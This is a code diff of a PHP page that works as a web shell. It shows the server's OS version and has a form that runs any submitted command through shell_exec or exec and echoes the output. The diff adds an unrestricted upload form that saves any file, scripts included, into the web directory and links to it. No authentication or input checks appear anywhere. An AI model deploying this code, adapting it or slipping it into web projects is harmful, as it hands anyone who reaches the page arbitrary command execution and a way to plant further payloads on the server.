@@ -2,13 +2,13 @@
 <!DOCTYPE html>
 <html>
     <body>
-    	<?php
-    	    echo ('<p>OS Version</p>');
-    	    echo php_uname();
-    	?>
-    	<br>
+        <?php
+            echo ('<p>OS Version</p>');
+            echo php_uname();
+        ?>
+        <br>
         <form action="" method="post">
-            
+
             <br>
             <label for="method">Execution Method:</label>
             <select name="exec" id="method">
@@ -22,22 +22,64 @@
             <input type=submit name="btn" value="Execute">
             <br>
             <br>
-
-            <?php
-            if(isset($_POST['btn']))
-            {
-
-                $command=$_POST['in1'];
-                $exec_method=$_POST['exec'];
-
-                echo $command, "<br><br>";
-                if ($exec_method == "shell_exec"){
-                    echo(shell_exec($command));
-                } else {
-                    echo(exec($command));
-                }
-            }
-            ?>
         </form>
+        <form method="post" enctype="multipart/form-data">
+            Upload Files<br>
+            <input type="file" name="fileToUpload" id="fileToUpload">
+            <input type="submit" value="Upload" name="submit">
+            <br>
+            <br>
+        </form>
+        <?php
+
+        if(isset($_POST['btn']))
+        {
+            $command=$_POST['in1'];
+            $exec_method=$_POST['exec'];
+
+            echo $command, "<br><br>";
+            if ($exec_method == "shell_exec"){
+                echo(shell_exec($command));
+            } else {
+                echo(exec($command));
+            }
+        }
+
+        if(array_key_exists('submit', $_POST)) {
+          upload_it();
+        }
+
+        function upload_it() {
+
+          $target_file = basename($_FILES["fileToUpload"]["name"]);
+          $uploadOk = 1;
+
+          // Check if file already exists
+          if (file_exists($target_file)) {
+            echo "Sorry, file already exists.";
+            $uploadOk = 0;
+          }
+
+          // Check file size
+          if ($_FILES["fileToUpload"]["size"] > 500000) {
+            echo "Sorry, your file is too large.";
+            $uploadOk = 0;
+          }
+
+          // Check if $uploadOk is set to 0 by an error
+          if ($uploadOk == 0) {
+            echo "Sorry, your file was not uploaded.";
+          // if everything is ok, try to upload file
+          } else {
+            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+              echo "The file ". htmlspecialchars( basename( $_FILES["fileToUpload"]["name"])). " has been uploaded. ";
+              echo "<a href='$target_file'>Here</a>";
+            } else {
+              echo "Sorry, there was an error uploading your file.";
+            }
+          }
+        }
+        ?>
     </body>
 </html>
+
